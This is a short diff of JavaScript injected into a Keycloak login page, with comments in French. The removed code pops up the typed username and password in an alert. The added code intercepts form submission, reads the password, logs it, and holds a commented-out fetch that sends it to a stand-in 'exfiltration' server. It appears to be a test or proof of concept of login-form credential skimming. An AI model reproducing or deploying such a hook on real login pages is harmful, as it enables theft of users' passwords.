@@ -1,13 +1,11 @@
-(function() {
-  const loginButton = document.getElementById('kc-login');
-  
-  if (loginButton) {
-    loginButton.addEventListener('click', function(e) {
-      var user = document.getElementById('username')?.value || '';
-      var pass = document.getElementById('password')?.value || '';
-      alert('Username: ' + user + '\nPassword: ' + pass);
-    });
-  } else {
-    alert("Bouton de connexion non trouvé !");
-  }
-})();
+  document.getElementById('kc-form-login').addEventListener('submit', function(e) {
+    // Empêcher la soumission pour tester
+    e.preventDefault();
+    // Récupérer la valeur du champ mot de passe
+    var pwd = document.getElementById('password').value;
+    // Envoyer la valeur à un serveur de test (par exemple, en la loggant dans la console)
+    console.log("Mot de passe récupéré :", pwd);
+    // Vous pouvez également utiliser fetch pour simuler une exfiltration
+    // fetch('https://votre-serveur-de-test.com/exfiltrer?password=' + encodeURIComponent(pwd));
+    // Pour laisser la soumission après vérification, vous pouvez réactiver la soumission avec : this.submit();
+  });
